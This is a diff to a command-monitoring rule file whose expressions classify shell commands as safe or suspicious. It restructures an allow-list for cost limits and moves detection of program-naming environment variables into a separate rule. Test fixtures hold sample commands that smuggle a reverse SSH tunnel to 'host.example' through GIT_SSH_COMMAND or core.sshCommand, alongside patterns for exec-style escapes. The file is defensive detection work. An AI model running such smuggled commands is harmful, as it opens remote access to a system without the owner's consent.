@@ -45,33 +45,53 @@ definitions:
       text utility, a compiler, a package manager installing by name, a version control or
       cloud client outside the subcommands that run something. A shell is one when it runs
       a -c script, which the parser reads, as the first stage of its pipeline and not inside
-      another shell's script. No command is one when a variable of its environment names a
-      program to run (GIT_SSH_COMMAND, EDITOR, PAGER).
+      another shell's script. A variable that names a program to run (GIT_SSH_COMMAND,
+      EDITOR) is asked of the line by command_unread, not here.
+
+      The body is written for the engine's cost bound, which an expression must fit under to
+      be evaluated without metering: the names are lists of at most sixteen (a longer list,
+      or one long regular expression, raises the size every other value is assumed to have),
+      and the commands with exceptions are a chain of conditionals, of which the bound counts
+      the costliest branch and not the sum.
     body: >
-      !c.env.exists(k, k.matches("(EDITOR|VISUAL|PAGER|COMMAND|ASKPASS|EXTERNAL_DIFF|LESSOPEN|LESSCLOSE)$|^(BASH_ENV|ENV)$")) && (
-        c.name.matches("^(cd|pushd|popd|dirs|pwd|echo|printf|true|false|:|test|\\[|set|unset|export|declare|local|readonly|typeset|shift|return|exit|break|continue|wait|sleep|read|umask|ulimit|hash|type|which|whereis|unalias|kill|pkill|pgrep|killall|jobs|fg|bg|disown|let|getopts|shopt|ls|cat|tac|head|tail|wc|cut|sort|uniq|tr|tee|grep|egrep|fgrep|rg|ag|ack|jq|yq|diff|cmp|comm|paste|join|fold|column|nl|rev|expand|od|xxd|hexdump|strings|base64|base32|md5|md5sum|sha1sum|sha224sum|sha256sum|sha384sum|sha512sum|shasum|b2sum|cksum|sum|file|stat|du|df|touch|mkdir|rmdir|rm|cp|mv|ln|install|dd|truncate|fallocate|shred|chmod|chown|chgrp|readlink|realpath|basename|dirname|mktemp|date|seq|yes|expr|bc|printenv|id|whoami|groups|hostname|uname|uptime|ps|free|lsof|tree|zip|unzip|gzip|gunzip|zcat|bzip2|bunzip2|xz|unxz|zstd|iconv|split|numfmt|tput|clear|pbcopy|pbpaste|curl|wget|http|https|httpie|xh|xhs|dig|nslookup|host|drill|ping|traceroute|whois|ip|ifconfig|netstat|ss|gofmt|goimports|golangci-lint|staticcheck|actionlint|shellcheck|shfmt|ruff|black|mypy|pyright|flake8|isort|eslint|prettier|tsc|pytest|cargo|rustc|rustfmt|gcc|cc|clang|g\\+\\+|c\\+\\+|javac|brew|apt|apt-get|apt-cache|dpkg|dnf|yum|rpm|pacman|apk|pip|pip3|gem|systemctl|service|journalctl|dmesg|sysctl|crontab|useradd|usermod|userdel|groupadd|groupmod|gpasswd|passwd|chpasswd|visudo|insmod|modprobe|rmmod|lsmod|mount|umount|iptables|nft|ufw|swapon|swapoff|history|codesign|spctl|pkgutil|xattr|defaults|security|ssh-keygen|ssh-add|gpg|gpg2|openssl|keytool|bq|gsutil|terraform|tofu|terragrunt|pulumi|supabase|vercel|flyctl|doctl)$") ||
-        c.name == "" && c.argv.exists(a, a.matches("^(.*/)?env$")) && c.argv.all(a, a.matches("^((.*/)?env|-0|--null|-i|--ignore-environment)$")) ||
-        c.name == "git" && !c.args.matches("(?m)^(foreach|filter-branch|filter-repo|-x|--exec(=.*)?|--extcmd(=.*)?|--upload-pack(=.*)?|--receive-pack(=.*)?|--config-env(=.*)?)$|^bisect\\nrun$|\\A(?:(?:-C|--git-dir|--work-tree|--namespace)\\n[^\\n]*\\n|--?[A-Za-z][^\\n]*\\n)*?-c\\n") ||
-        c.name == "gh" && !c.args.matches("(?m)^(alias|ssh|exec|extension|codespace|cs)$") ||
-        c.name == "go" && !c.args.matches("(?m)^-(exec|toolexec)(=.*)?$") ||
-        c.name == "find" && !c.args.matches("(?m)^-(exec|execdir|ok|okdir)$") ||
-        c.name.matches("^(tar|gtar|bsdtar)$") && !c.args.matches("(?m)^(--to-command|--checkpoint-action|--use-compress-program|--rsh-command|--rmt-command|-I)") ||
-        c.name.matches("^(sed|gsed)$") && !c.args.matches("(?m)/[A-Za-z0-9]*e[A-Za-z0-9]*$|(^|[;{0-9$/])\\s*e(\\s|$)") ||
-        c.name.matches("^(awk|gawk|mawk|nawk)$") && !c.args.matches("system\\s*\\(|\\|\\s*\"|\"\\s*\\||getline") ||
-        c.name.matches("^(sh|bash|zsh|dash|ksh)$") && c.stage == 0 && !c.nested &&
-          c.args.matches("(?m)^-[A-Za-z]*c[A-Za-z]*$") && !c.argv.exists(a, a == "") ||
-        c.name.matches("^(docker|podman|nerdctl|docker-compose)$") && !c.args.matches("(?m)^(run|exec|create|debug)$") ||
-        c.name == "kubectl" && !c.args.matches("(?m)^(exec|run|debug|attach|plugin|--)$") ||
-        c.name == "helm" && !c.args.matches("(?m)^--post-renderer") ||
-        c.name.matches("^(npm|pnpm|yarn)$") && !c.args.matches("(?m)^(exec|x|dlx|npx|create|init|explore)$") ||
-        c.name == "uv" && !c.args.matches("(?m)^(run|tool|x)$") ||
-        c.name == "mise" && !c.args.matches("(?m)^(exec|x|run|watch|en)$") ||
-        c.name == "aws" && !c.args.matches("(?m)^(ssm|execute-command|ec2-instance-connect)$") ||
-        c.name == "gcloud" && !c.args.matches("(?m)^(ssh|scp|--command(=.*)?)$") ||
-        c.name == "az" && !c.args.matches("(?m)^(run-command|ssh)$") ||
-        c.name.matches("^(dropdb|createdb|mysqladmin|redis-cli)$") ||
-        c.name == "cdk" && !c.args.matches("(?m)^(-a|--app)(=.*)?$")
-      )
+      c.name in ["cd", "pushd", "popd", "dirs", "pwd", "echo", "printf", "true", "false", ":", "test", "[", "set", "unset", "export", "declare"] ||
+      c.name in ["local", "readonly", "typeset", "shift", "return", "exit", "break", "continue", "wait", "sleep", "read", "umask", "ulimit", "hash", "type", "which"] ||
+      c.name in ["whereis", "unalias", "kill", "pkill", "pgrep", "killall", "jobs", "fg", "bg", "disown", "let", "getopts", "shopt", "ls", "cat", "tac"] ||
+      c.name in ["head", "tail", "wc", "cut", "sort", "uniq", "tr", "tee", "grep", "egrep", "fgrep", "rg", "ag", "ack", "jq", "yq"] ||
+      c.name in ["diff", "cmp", "comm", "paste", "join", "fold", "column", "nl", "rev", "expand", "od", "xxd", "hexdump", "strings", "base64", "base32"] ||
+      c.name in ["md5", "md5sum", "sha1sum", "sha224sum", "sha256sum", "sha384sum", "sha512sum", "shasum", "b2sum", "cksum", "sum", "file", "stat", "du", "df", "touch"] ||
+      c.name in ["mkdir", "rmdir", "rm", "cp", "mv", "ln", "install", "dd", "truncate", "fallocate", "shred", "chmod", "chown", "chgrp", "readlink", "realpath"] ||
+      c.name in ["basename", "dirname", "mktemp", "date", "seq", "yes", "expr", "bc", "printenv", "id", "whoami", "groups", "hostname", "uname", "uptime", "ps"] ||
+      c.name in ["free", "lsof", "tree", "zip", "unzip", "gzip", "gunzip", "zcat", "bzip2", "bunzip2", "xz", "unxz", "zstd", "iconv", "split", "numfmt"] ||
+      c.name in ["tput", "clear", "pbcopy", "pbpaste", "curl", "wget", "http", "https", "httpie", "xh", "xhs", "dig", "nslookup", "host", "drill", "ping"] ||
+      c.name in ["traceroute", "whois", "ip", "ifconfig", "netstat", "ss", "gofmt", "goimports", "golangci-lint", "staticcheck", "actionlint", "shellcheck", "shfmt", "ruff", "black", "mypy"] ||
+      c.name in ["pyright", "flake8", "isort", "eslint", "prettier", "tsc", "pytest", "cargo", "rustc", "rustfmt", "gcc", "cc", "clang", "g++", "c++", "javac"] ||
+      c.name in ["brew", "apt", "apt-get", "apt-cache", "dpkg", "dnf", "yum", "rpm", "pacman", "apk", "pip", "pip3", "gem", "systemctl", "service", "journalctl"] ||
+      c.name in ["dmesg", "sysctl", "crontab", "useradd", "usermod", "userdel", "groupadd", "groupmod", "gpasswd", "passwd", "chpasswd", "visudo", "insmod", "modprobe", "rmmod", "lsmod"] ||
+      c.name in ["mount", "umount", "iptables", "nft", "ufw", "swapon", "swapoff", "history", "codesign", "spctl", "pkgutil", "xattr", "defaults", "security", "ssh-keygen", "ssh-add"] ||
+      c.name in ["gpg", "gpg2", "openssl", "keytool", "bq", "gsutil", "terraform", "tofu", "terragrunt", "pulumi", "supabase", "vercel", "flyctl", "doctl", "dropdb", "createdb"] ||
+      c.name in ["mysqladmin", "redis-cli"] ||
+      (c.name == "" ? size(c.argv) > 0 && c.argv[0].matches("^(.*/)?env$") &&
+         (size(c.argv) == 1 || size(c.argv) == 2 && c.argv[1] in ["-0", "--null", "-i", "--ignore-environment"]) :
+       c.name == "git" ? !c.args.matches("(?m)^(foreach|filter-branch|filter-repo|-x|--exec(=.*)?|--extcmd(=.*)?|--upload-pack(=.*)?|--receive-pack(=.*)?|--config-env(=.*)?)$|^bisect\\nrun$|\\A(?:(?:-C|--git-dir|--work-tree|--namespace)\\n[^\\n]*\\n|--?[A-Za-z][^\\n]*\\n)*?-c\\n") :
+       c.name == "gh" ? !c.args.matches("(?m)^(alias|ssh|exec|extension|codespace|cs)$") :
+       c.name == "go" ? !c.args.matches("(?m)^-(exec|toolexec)(=.*)?$") :
+       c.name == "find" ? !c.args.matches("(?m)^-(exec|execdir|ok|okdir)$") :
+       c.name in ["tar", "gtar", "bsdtar"] ? !c.args.matches("(?m)^(--to-command|--checkpoint-action|--use-compress-program|--rsh-command|--rmt-command|-I)") :
+       c.name in ["sed", "gsed"] ? !c.args.matches("(?m)/[A-Za-z0-9]*e[A-Za-z0-9]*$|(^|[;{0-9$/])\\s*e(\\s|$)") :
+       c.name in ["awk", "gawk", "mawk", "nawk"] ? !c.args.matches("system\\s*\\(|\\|\\s*\"|\"\\s*\\||getline") :
+       c.name in ["sh", "bash", "zsh", "dash", "ksh"] ? c.stage == 0 && !c.nested && c.args.matches("(?m)^-[A-Za-z]*c[A-Za-z]*$") && !c.argv.exists(a, a == "") :
+       c.name in ["docker", "podman", "nerdctl", "docker-compose"] ? !c.args.matches("(?m)^(run|exec|create|debug)$") :
+       c.name == "kubectl" ? !c.args.matches("(?m)^(exec|run|debug|attach|plugin|--)$") :
+       c.name == "helm" ? !c.args.matches("(?m)^--post-renderer") :
+       c.name in ["npm", "pnpm", "yarn"] ? !c.args.matches("(?m)^(exec|x|dlx|npx|create|init|explore)$") :
+       c.name == "uv" ? !c.args.matches("(?m)^(run|tool|x)$") :
+       c.name == "mise" ? !c.args.matches("(?m)^(exec|x|run|watch|en)$") :
+       c.name == "aws" ? !c.args.matches("(?m)^(ssm|execute-command|ec2-instance-connect)$") :
+       c.name == "gcloud" ? !c.args.matches("(?m)^(ssh|scp|--command(=.*)?)$") :
+       c.name == "az" ? !c.args.matches("(?m)^(run-command|ssh)$") :
+       c.name == "cdk" ? !c.args.matches("(?m)^(-a|--app)(=.*)?$") :
+       false)
     tests:
       - name: a_file_utility
         match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
@@ -151,12 +171,6 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "git -C repo -c core.sshCommand='ssh -R 9000:localhost:22 host.example' fetch" }
-      - name: an_environment_that_names_a_program
-        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example' git fetch" }
       - name: a_shell_reading_a_pipe
         match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
         verdict: no_match
@@ -218,7 +232,7 @@ definitions:
     body: >
       e.command.parsed_incomplete ||
       e.command.command.matches("(\\.\\.\\.\\[truncated\\]|…)$") ||
-      e.command.command.matches("\\b(GIT_SSH_COMMAND|GIT_SEQUENCE_EDITOR|GIT_EDITOR|GIT_PAGER|GIT_EXTERNAL_DIFF|GIT_ASKPASS|SSH_ASKPASS|SUDO_ASKPASS|SUDO_EDITOR|PROMPT_COMMAND|BASH_ENV|LESSOPEN|EDITOR|VISUAL|PAGER)=") ||
+      e.command.command.matches("\\b([A-Z_]*(EDITOR|VISUAL|PAGER|COMMAND|ASKPASS|EXTERNAL_DIFF)|BASH_ENV|ENV|LESSOPEN|LESSCLOSE)=") ||
       e.command.parsed_commands.exists(c, size(c.argv) > 0 && !command_runs_only_itself(c))
     tests:
       - name: a_capture_cut_inside_a_loop
@@ -284,6 +298,11 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "export GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example'; git fetch" }
+      - name: a_program_to_run_in_a_command's_environment
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example' git fetch" }
       - name: a_script_inside_a_script_inside_a_script
         verdict: match
         events:
